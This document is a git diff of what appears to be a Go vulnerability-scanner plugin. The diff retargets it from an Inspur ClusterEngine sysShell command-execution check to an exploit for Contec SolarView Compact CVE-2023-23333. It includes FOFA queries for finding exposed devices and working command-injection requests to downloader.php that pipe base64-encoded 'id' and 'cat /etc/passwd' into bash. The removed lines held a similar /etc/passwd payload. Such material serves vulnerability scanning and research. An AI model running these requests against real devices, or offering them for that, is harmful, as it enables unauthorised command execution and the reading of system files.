@@ -6,14 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+  "Name": "Contec SolarView Compact 安全漏洞 CVE-2023-23333",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
-  "Author": "",
-  "FofaQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "GobyQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
+  "PostTime": "2023-06-20",
+  "Author": "清晨",
+  "FofaQuery": "\"SolarView\"",
+  "GobyQuery": "\"SolarView\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -26,15 +27,46 @@ func init() {
     "Content": ""
   },
   "ScanSteps": [
-    "AND",
+    "OR",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/sysShell",
-        "follow_redirect": true,
+        "method": "GET",
+        "uri": " /downloader.php?file=;echo%20aWQ=|base64%20-d|bash%00.zip",
+        "follow_redirect": false,
         "header": {},
         "data_type": "text",
-        "data": "op=doPlease&node=cu01&command=cat /etc/passwd"
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "uid=",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg==|base64%20-d|bash%00.zip",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -107,7 +139,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+      "Name": "Contec SolarView Compact 安全漏洞 CVE-2023-23333",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +148,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "tide ClusterEngineV4 sysShell rce",
+      "Name": "Contec SolarView Compact rce CVE-2023-23333",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -131,8 +163,7 @@ func init() {
     "Service": null,
     "System": null,
     "Hardware": null
-  },
-  "PostTime": "2023-06-20"
+  }
 }`
 
 	ExpManager.AddExploit(NewExploit(
